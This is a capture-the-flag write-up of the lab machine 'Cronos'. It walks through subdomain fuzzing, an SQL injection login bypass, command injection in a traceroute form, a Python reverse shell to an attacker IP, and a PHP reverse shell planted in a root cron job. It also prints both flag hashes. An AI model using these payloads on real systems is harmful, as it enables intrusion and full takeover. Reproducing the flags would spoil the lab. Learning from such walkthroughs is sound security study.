Machine name: Cronos   
Machine IP: 10.129.227.211   

First of all we starded by scanning for open ports:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ rustscan -a 10.129.227.211         
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```
Let's add this ip with the cronos.htb domanin into the /etc/hosts file.     

----
The web-page was empty, so I decided to make a directory and subdomain scan. Directory scan didn't give any important result, but the subdomain scan has useful findings:     
```bash
ffuf -H "Host: FUZZ.cronos.htb" -u http://cronos.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ic -fs 11439

www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 205ms]
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 2272ms]
web17111                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2098ms]
www.chef                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2539ms]
web18761                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2183ms]
web4297                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1467ms]
qv                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1494ms]
web17061                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1161ms]
advocate                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1158ms]
web6421                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1183ms]
web18750                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1179ms]
web6422                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1214ms]
www.washington          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1220ms]
web6425                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1552ms]
web6432                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1607ms]
:: Progress: [114438/114438] :: Job [1/1] :: 238 req/sec :: Duration: [0:09:45] :: Errors: 105 ::

```
Only the admin.cronos.htb domani will help us because others has 0 size and the www.cronos.htb is same with the cronos.htb domain.     

----
When I opened the http://admin.cronos.htb site, I saw a login page in there. The subdomain is 'admin', so I decided to brute force for that user. But unfortunately hydra takes soo much time and didnt give any password even after 10 minutes.    
So, I decided to chech SQL injection because the web page looked so simple and maybe it could be vulnerable for this type of attack.    
|    
<img width="941" height="679" alt="image" src="https://github.com/user-attachments/assets/627983fd-9193-4fdd-9a8c-74c1440b04a5" />    
|    
Yeah, It worked. After successfully bypassing the login portal using SQL Injection, I was redirected to welcome.php. This page featured a network tool utility (e.g., Ping/Traceroute) that accepts user input. I tested the input field for Command Injection.     
I just catched the request on burp suite. Let's look through it.   
|      
<img width="568" height="528" alt="image" src="https://github.com/user-attachments/assets/dcf72b6a-f3c6-4573-8205-39fb29fed367" />    
|    
```bash
# I just change this line:
command=traceroute&host=8.8.8.8
# To this line:
command=whoami
```
And It worked I am www-data user right now.     
The response header:    
<img width="568" height="528" alt="image" src="https://github.com/user-attachments/assets/312943ae-95d3-43de-806a-ebce95dc4e46" />    
Now, I will try reverse shell. Open a nc connection on my terminal and use this command to get shell.    
```bash
command=python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.54",4554));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
Yeah, we got the shell and took the user flag:    
```bash                                                                                                                                                                                                                                        
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ rlwrap nc -lvnp 4554
listening on [any] 4554 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.15.82] 54688
www-data@cronos:/var/www/admin$ cd /home
cd /home
www-data@cronos:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 May 10  2022 .
drwxr-xr-x 23 root   root   4096 May 10  2022 ..
drwxr-xr-x  4 noulis noulis 4096 May 10  2022 noulis
www-data@cronos:/home$ cd noulis
cd noulis
www-data@cronos:/home/noulis$ ls -la
ls -la
total 32
drwxr-xr-x 4 noulis noulis 4096 May 10  2022 .
drwxr-xr-x 3 root   root   4096 May 10  2022 ..
-rw-r--r-- 1 noulis noulis  220 Mar 22  2017 .bash_logout
-rw-r--r-- 1 noulis noulis 3771 Mar 22  2017 .bashrc
drwx------ 2 noulis noulis 4096 May 10  2022 .cache
drwxr-xr-x 3 root   root   4096 May 10  2022 .composer
-rw-r--r-- 1 noulis noulis  655 Mar 22  2017 .profile
-r--r--r-- 1 noulis noulis   33 Apr  4 12:10 user.txt
www-data@cronos:/home/noulis$ cat user	
cat user.txt 
27805ebdd591d1568bc05260add09798
www-data@cronos:/home/noulis$ 
```

----
# Privilege Escalation  
When I looked /etc/crontab file, I saw that the "php /var/www/laravel/artisan" is executes with root privileges each minute. I checked if www-data user has write access on this file:    
```bash
www-data@cronos:/home/noulis$ ls -la /var/www/laravel/artisan
ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```
Yeah, I can write anything in this file. The first thing I thought was to add a php reverse shell code to this file and wait for being root. It is php file as we saw from the /etc/crontab so, I will use this command to get shell.    
```bash
echo '<?php $sock=fsockopen("10.10.14.54",5555);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > /var/www/laravel/artisan
```
Don't forget to open a nc connection on another terminal by 5555 port.    
After a minute, I got root flag.  
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ rlwrap nc -lvnp 5555      
listening on [any] 5555 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.15.82] 44410
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
a02dbd7a1b9c835dc9ef07147ceb2aa8
# 
```

















